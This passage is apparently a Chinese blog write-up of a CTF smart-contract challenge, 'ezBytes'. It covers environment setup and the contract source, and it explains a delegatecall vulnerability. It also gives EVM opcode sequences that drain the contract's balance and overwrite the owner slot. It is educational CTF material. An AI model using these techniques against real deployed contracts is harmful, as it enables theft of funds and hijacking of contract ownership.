@@ -1,0 +1,831 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" href="/img/fav.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sl0th">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ezBytes0x00 序言校赛出的一道智能合约的wp，记录一下 0x01 环境基本配置钱包连接私链首先需要准备一个metamask(一个钱包软件，浏览器插件)，随意注册一个账号即可（网上教程很多，这里不赘述，可以参考https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1Ca411n7ta?p&#x3D;7&amp;vd_source&#x3D;5ec02b685bc73487523c9c6794fde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ezBytes-出题记录&#x2F;wp">
+<meta property="og:url" content="http://sloth31.github.io/2023/10/02/ezBytes-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/index.html">
+<meta property="og:site_name" content="Sl0th&#39;s Blog">
+<meta property="og:description" content="ezBytes0x00 序言校赛出的一道智能合约的wp，记录一下 0x01 环境基本配置钱包连接私链首先需要准备一个metamask(一个钱包软件，浏览器插件)，随意注册一个账号即可（网上教程很多，这里不赘述，可以参考https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1Ca411n7ta?p&#x3D;7&amp;vd_source&#x3D;5ec02b685bc73487523c9c6794fde">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242540.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242433.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242383.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241777.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241215.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241306.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241998.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241787.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241096.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241807.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241555.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241294.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241535.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241783.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241156.png">
+<meta property="article:published_time" content="2023-10-02T04:30:12.000Z">
+<meta property="article:modified_time" content="2024-08-22T18:32:05.868Z">
+<meta property="article:author" content="Sl0th">
+<meta property="article:tag" content="solidity">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242540.png">
+  
+  
+  
+  <title>ezBytes-出题记录/wp | Sl0th&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Sl0th&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ezBytes-出题记录/wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-02 12:30" pubdate>
+          2023年10月2日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          67 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ezBytes-出题记录/wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ezBytes"><a href="#ezBytes" class="headerlink" title="ezBytes"></a>ezBytes</h1><h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00 序言"></a>0x00 序言</h2><p>校赛出的一道智能合约的wp，记录一下</p>
+<h2 id="0x01-环境基本配置"><a href="#0x01-环境基本配置" class="headerlink" title="0x01 环境基本配置"></a>0x01 环境基本配置</h2><h3 id="钱包连接私链"><a href="#钱包连接私链" class="headerlink" title="钱包连接私链"></a>钱包连接私链</h3><p>首先需要准备一个metamask(一个钱包软件，浏览器插件)，随意注册一个账号即可（网上教程很多，这里不赘述，可以参考<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ca411n7ta?p=7&amp;vd_source=5ec02b685bc73487523c9c6794fde5c4">https://www.bilibili.com/video/BV1Ca411n7ta?p=7&amp;vd_source=5ec02b685bc73487523c9c6794fde5c4</a> p7）</p>
+<img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242540.png" srcset="/img/loading.gif" lazyload alt="image-20231128202757837" style="zoom:50%;" />
+
+<p>新建网络，加入题目的rpc(私链),chain ID会自动识别(图中报错高速chain id是23896，更改即可)，货币符号填写ETH</p>
+<img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242433.png" srcset="/img/loading.gif" lazyload alt="image-20231128203720784" style="zoom:33%;" />
+
+<h3 id="查看私钥"><a href="#查看私钥" class="headerlink" title="查看私钥"></a>查看私钥</h3><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290242383.png" srcset="/img/loading.gif" lazyload alt="image-20231128205729043" style="zoom:33%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241553.png" srcset="/img/loading.gif" lazyload alt="image-20231128205751032" style="zoom:33%;" />
+
+<p>之后输入密码即可获取账户的私钥</p>
+<h3 id="faucet-水龙头-获取测试币"><a href="#faucet-水龙头-获取测试币" class="headerlink" title="faucet(水龙头)获取测试币"></a>faucet(水龙头)获取测试币</h3><p>只需要把公钥输入即可获取1ETH（cd 1分钟）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241777.png" srcset="/img/loading.gif" lazyload alt="image-20231128205414832"></p>
+<h3 id="题目合约部署"><a href="#题目合约部署" class="headerlink" title="题目合约部署"></a>题目合约部署</h3><p>首先访问题目创建一个deployer账户，注意：只能知道该用户的公钥，不知道私钥，而最后部署solver合约时需要账户的私钥，因此需要用到上面那个用metamask钱包软件创建的用户。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241215.png" srcset="/img/loading.gif" lazyload alt="image-20231128205847508"></p>
+<blockquote>
+<p>token也需要保存，题目后面会用来部署题目合约，同时这里最后提示了需要向deployer用户转1.002测试币以部署合约</p>
+</blockquote>
+<p>先用水龙头向deployer用户转2个测试币（可以给自己用metamask创的号也转2个测试币），接下来就可以选择2进行challenge合约的部署了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241306.png" srcset="/img/loading.gif" lazyload alt="image-20231128210457365"></p>
+<blockquote>
+<p>可以看到成功部署了合约，合约地址为0xee7Cc887214b782563D9E4D42A124684e20E15bd</p>
+<p>题目也提示了需要让isSloved()返回true</p>
+</blockquote>
+<h3 id="Remix-IDE在线部署题目合约"><a href="#Remix-IDE在线部署题目合约" class="headerlink" title="Remix IDE在线部署题目合约"></a>Remix IDE在线部署题目合约</h3><p>访问选项4可以获取合约的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.7.2;<br>contract ezBytes&#123;<br>    address public  i_owner;<br>    bytes32 private  password=&quot;jnctf2023&quot;;<br>    constructor() payable  public&#123;<br>        i_owner = msg.sender;<br><br>    &#125;<br>    modifier onlyOwner &#123;<br>        if(msg.sender != i_owner) &#123; require(false); &#125;<br>        _;<br>    &#125;<br>    function challenge(address _yourContractAdd) public payable&#123;<br><br>        uint256 size;<br>        bytes memory your_code;<br><br>        assembly&#123;<br>            size := extcodesize(_yourContractAdd)<br>            your_code := mload(0x40)<br>            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))<br>            mstore(your_code, size)<br>            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)<br>        &#125;<br>        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;<br>            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );<br>        &#125;<br>        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);<br>        require(success,&quot;Delegatecall failed&quot;);<br>    &#125;<br>    function check() public view returns(bool)&#123;<br>        return address(this).balance == 0;<br>    &#125;<br>    function changePassword(bytes32 str)onlyOwner payable public&#123;<br>        password=str;<br>    &#125;<br>    function checkPassword() public view returns (bool)&#123;<br>        return password==&quot;22222222222222&quot;;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        bool flag1=check();<br>        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);<br>        bool flag2=checkPassword();<br>        require(flag2,&quot;Password is wrong.&quot;);<br>        return flag1&amp;&amp;flag2 ;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>打开在线IDE Remix <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">https://remix.ethereum.org/</a> (需要科学上网🧐💡)新建一个ezBytes.sol文件,编译选项页面记得选择编译器版本为源码开头标识的0.7.2, 编译成功后即可部署</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241998.png" srcset="/img/loading.gif" lazyload alt="image-20231128210842347"></p>
+<p>切换到部署界面，选择环境为metamask，这样才能访问到私链上的合约，在At Address处写下刚才获取的challenge合约地址0xee7Cc887214b782563D9E4D42A124684e20E15bd</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241787.png" srcset="/img/loading.gif" lazyload alt="image-20231128211753657"></p>
+<p>点击“At Address”即可得到challenge合约</p>
+<img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241096.png" srcset="/img/loading.gif" lazyload alt="image-20231128211834506" style="zoom: 50%;" />
+
+<h2 id="0x02-合约分析"><a href="#0x02-合约分析" class="headerlink" title="0x02 合约分析"></a>0x02 合约分析</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.7.2;<br>contract ezBytes&#123;<br>    address public  i_owner;<br>    bytes32 private  password=&quot;jnctf2023&quot;;<br>    constructor() payable  public&#123;<br>        i_owner = msg.sender;//初始化i_owner，由于合约构造函数执行的那个交易是deployer账号发起的，因此i_owner就对标了合约所有者<br>    &#125;<br>    modifier onlyOwner &#123;//被onlyOwner修饰的函数只有合约所有者才能执行<br>        if(msg.sender != i_owner) &#123; require(false); &#125;<br>        _;<br>    &#125;<br>    function challenge(address _yourContractAdd) public payable&#123;<br><br>        uint256 size;<br>        bytes memory your_code;<br><br>        assembly&#123;//动态获取给定合约地址 _yourContractAdd 的代码，然后将其复制到以 mload(0x40) 为起始位置的内存中，后面的三行主要是为了保证size<br>            size := extcodesize(_yourContractAdd)<br>            your_code := mload(0x40)<br>            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))//保证是32字节的倍数<br>            mstore(your_code, size)<br>            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)//从目标合约的开头复制size大小的字节到内存中<br>        &#125;<br>        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;<br>            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);<br>            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );<br>        &#125;<br>        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);<br>        require(success,&quot;Delegatecall failed&quot;);<br>    &#125;<br>    function check() public view returns(bool)&#123;<br>        return address(this).balance == 0;<br>    &#125;<br>    function changePassword(bytes32 str)onlyOwner payable public&#123;//<br>        password=str;<br>    &#125;<br>    function checkPassword() public view returns (bool)&#123;<br>        return password==&quot;22222222222222&quot;;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        bool flag1=check();<br>        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);<br>        bool flag2=checkPassword();<br>        require(flag2,&quot;Password is wrong.&quot;);<br>        return flag1&amp;&amp;flag2 ;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>首先看到最终需要让其返回true的isSolved函数总共需要解决两个条件</p>
+<ul>
+<li>盗取合约内的所有balance（余额）</li>
+<li>修改password（changePassword函数只有合约所有者才可以执行）</li>
+</ul>
+<p>很明显看到challenge函数有合约地址可控的delegatecall调用</p>
+<h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>delegatecall调用很容易可以联想到委托调用漏洞，delegatecall的参数是函数的abi，简单来说只要delegatecall参数，及前面的addr都可控，就能实现当前合约执行任意合约的任意方法（相当于直接把那个函数插入到当前合约代码中直接执行）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202311290241807.png" srcset="/img/loading.gif" lazyload alt="image-20231128213125822"></p>
+<blockquote>
+<p>可以看到上面A合约通过委托调用了B合约的方法修改了自身的属性</p>
+<p>这里再加一个概念Slot，以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"># 插槽式数组存储</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               0                |     # slot 0</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               1                |     # slot 1</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|               2                |     # slot 2</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # ...</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # 每个插槽 32 字节</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|              ...               |     # ...</span><br><span class="hljs-section">----------------------------------</span><br><span class="hljs-section">|            2^256-1             |     # slot 2^256-1</span><br><span class="hljs-section">----------------------------------</span><br></code></pre></td></tr></table></figure>
+
+<p>编译时将严格根据字段排序顺序(*)，从位置 0 开始连续放置在存储中。如果可能的话，大小少于 32 字节的多个变量会被打包到一个插槽中，而当某项数据超过 32 字节，则需要占用多个连续插槽</p>
+<p>如下合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.0;<br><br>contract C &#123;<br> address a;      // 0<br> uint8 b;        // 0<br> uint256 c;      // 1<br> bytes24 d;      // 2<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存储布局如下</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-code">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="hljs-code">-----------------------------------------------------</span><br><span class="hljs-section">|                       c (32)                      | &lt;- slot 1</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-section">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="hljs-section">-----------------------------------------------------</span><br></code></pre></td></tr></table></figure>
+</blockquote>
+<p>再看一下对于delegatecall调用的字节码的限制，题目合约中会先将目标合约的字节码先复制过来逐字节检查</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">for(uint256 i = 0; i &lt; your_code.length; i++) &#123;<br>    require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);<br>    require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);<br>    require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);<br>    require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>限制了不能用</p>
+<ul>
+<li>0xff(自毁合约指令可以让合约自行销毁，并将账户中的ETH余额发送到指定地址)</li>
+<li>0xf5(CREATE2,可以部署一个新合约并发送指定数量wei的ETH)</li>
+<li>0x01(ADD)</li>
+<li>所有偶数的Opcodes</li>
+<li>0x00(STOP)</li>
+</ul>
+</blockquote>
+<h3 id="盗取合约内余额"><a href="#盗取合约内余额" class="headerlink" title="盗取合约内余额"></a>盗取合约内余额</h3><h4 id="先介绍几个EVM-Opcode"><a href="#先介绍几个EVM-Opcode" class="headerlink" title="先介绍几个EVM Opcode"></a>先介绍几个EVM Opcode</h4><p>更多Opcode可以参考<a target="_blank" rel="noopener" href="https://www.evm.codes/?fork=shanghai">https://www.evm.codes/?fork=shanghai</a></p>
+<ul>
+<li><p>SELFBALANCE：将合约余额压入栈中，单位为<code>wei</code></p>
+</li>
+<li><p>SSTORE：将栈顶的两个元素视为key和value(栈顶),将value赋值给第key个slot</p>
+</li>
+<li><p>CALL:创建一个子环境来执行其他合约的部分代码，发送<code>ETH</code>，并返回success(发送ETH是否成功)</p>
+<p>CALL会从堆栈中弹出7个参数，依次为：</p>
+<ul>
+<li><code>gas</code>：为这次调用分配的gas量。</li>
+<li><code>to</code>：被调用合约的地址。</li>
+<li><code>value</code>：要发送的以太币数量，单位为<code>wei</code>。</li>
+<li><code>mem_in_start</code>：输入数据（calldata）在内存的起始位置。</li>
+<li><code>mem_in_size</code>：输入数据的长度。</li>
+<li><code>mem_out_start</code>：返回数据（returnData）在内存的起始位置。</li>
+<li><code>mem_out_size</code>：返回数据的长度。</li>
+</ul>
+</li>
+</ul>
+<p>可以构造7个栈输入使得合约余额全部转到某个地址，下面示例是直接转到0地址</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">SELFBALANCE</span><br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">PUSH2</span> <span class="hljs-number">0</span>x0000<br><span class="hljs-attribute">CALL</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里用PUSH2是因为限制不能用偶数的Opcode</p>
+</blockquote>
+<h3 id="修改合约所有者"><a href="#修改合约所有者" class="headerlink" title="修改合约所有者"></a>修改合约所有者</h3><p>由于源码中i_owner处于slot 0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.7.2;<br>contract ezBytes&#123;<br>    address public  i_owner;<br>    //...<br></code></pre></td></tr></table></figure>
+
+<p>可以利用SSTORE以及CALLER，把调用合约的合约地址（我们自身）赋值给slot 0</p>
